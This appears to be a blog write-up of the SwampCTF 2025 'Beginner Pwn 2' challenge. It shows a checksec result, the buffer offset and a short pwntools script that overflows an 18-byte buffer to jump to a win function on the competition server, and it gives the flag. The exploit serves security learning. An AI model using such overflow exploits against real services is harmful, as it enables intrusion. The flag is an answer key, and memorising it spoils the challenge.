---
layout: post
title: "SwampCTF 2025: Beginner Pwn 2"
author: yoshixi
tags: [writeup, pwn]
---


author: @yoshixi
solved with: @bentley
## **Challenge Info:**
##### Category: Pwn
![beginnerpwn2](https://digitalyoshixi.github.io/ctfs/swampctf2025/beginnerpwn.webp)

[Download](https://ctf.swampctf.com/files/ba73e4e10e45fd89e46dfc3842c14cbd/binary?token=eyJ1c2VyX2lkIjoxOTEsInRlYW1faWQiOjEwOCwiZmlsZV9pZCI6MjZ9.Z-oS_g.KjaTKth3XM4R_StKJgNkf2RbHQ8)

## Solution
We take a look at `checksec`

![checksec](https://digitalyoshixi.github.io/ctfs/swampctf2025/checksec.webp)

This is good. We have no PIE and no canary. Straightforwards

Now, we try to find the return address

![checksec](https://digitalyoshixi.github.io/ctfs/swampctf2025/retaddr.webp)

Turns out the buffer size is 18, so anything afterwards is now the return statement.

We get the correct script as:

```
import pwn

r = pwn.remote("chals.swampctf.com", 40001)
win_addr = 0x401186

payload = b"A" * 18
payload += pwn.p64(win_addr)
r.sendline(payload)
print(r.recvall().decode('latin-1'))  # Print flag
r.close()
```

## Flag is: `swampCTF{1t5_t1m3_t0_r3turn!!}`